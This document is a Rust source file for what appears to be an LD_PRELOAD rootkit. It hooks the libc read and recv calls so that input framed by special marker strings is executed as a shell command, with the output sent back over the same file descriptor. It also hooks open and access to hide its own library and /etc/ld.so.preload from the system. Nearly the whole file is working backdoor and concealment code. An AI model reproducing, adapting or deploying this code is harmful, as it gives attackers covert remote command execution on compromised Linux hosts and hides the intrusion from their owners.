mod modules;
mod util;

use std::os::raw::c_void;
use std::collections::HashSet;
use redhook::{real,hook};
use lazy_static::lazy_static;
use std::path::{Path, PathBuf};
use nix::unistd::{fork, ForkResult, close, write};
use std::env;
use errno::{Errno,set_errno};
use crate::modules::{shell, cmd};
use crate::util::{check_path,split_string,from_c_str};

static HEAD: &str = "^^^^";
static TAIL: &str = "$$$$";
lazy_static! {
    static ref HIDE_PATHS: HashSet<&'static str> = ["/home/keane/dev/hook/target/debug/libhook.so", "/etc/ld.so.preload"].iter().cloned().collect();
}

fn run_module(command: &str, fd: i32) {
    let args: &[&str] = &command.split(" ").collect::<Vec<&str>>()[1..];
    let command = split_string(command, " ", 0);
    let result = match command {
        "shell" => shell(fd, args),
        "cmd" => cmd(fd, args),
        _ => "no command".to_string()
    };
    write(fd, result.as_bytes()).unwrap();
}

fn handle_cmd(command: &str, fd: i32) {
    println!("Received command: `{}'", command);
    if command.starts_with("|") {
        run_module(&command[1..], fd);
    } else {
        match fork() {
            Ok(ForkResult::Child) => {
                run_module(command, fd)
            }
            Ok(ForkResult::Parent { child, .. }) => {
                close(fd).unwrap();
            }
            Err(_) => {}
        }
    }
}

fn handle_hook(buf: &str, fd: i32) -> bool {
    if let Some(start) = buf.find(HEAD)  {
        if let Some(end) = buf[start..].find(TAIL) {
            env::set_var("LD_PRELOAD", "");
            handle_cmd(&buf[start+HEAD.len()..end], fd);
            return true;
        }
    } else {
        return false;
    }
    false
}

hook! {
    unsafe fn read(fd: i32, buf: *mut c_void, count: u32) -> i32 => my_read {
        if handle_hook(&from_c_str(buf), fd) {
            0
        } else {
            real!(read)(fd, buf, count)
         }
    }
}

hook! {
    unsafe fn recv(fd: i32, buf: *mut c_void, count: u32, flags: i32) -> i32 => my_recv {
        if handle_hook(&from_c_str(buf), fd) {
            0
        } else {
            real!(recv)(fd, buf, count, flags)
         }
    }
}

hook! {
    unsafe fn open(pathname: *mut c_void, flags: i32) -> i32 => my_open {
        if check_path(pathname) {
            set_errno(Errno(2));
            return -1;
        } else {
            real!(open)(pathname, flags)
        }
    }
}

hook! {
    unsafe fn access(pathname: *mut c_void, mode: i32) -> i32 => my_access {
        if check_path(pathname) {
            set_errno(Errno(2));
            return -1;
        } else {
            real!(access)(pathname, mode)
        }
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        assert_eq!(2 + 2, 4);
    }
}
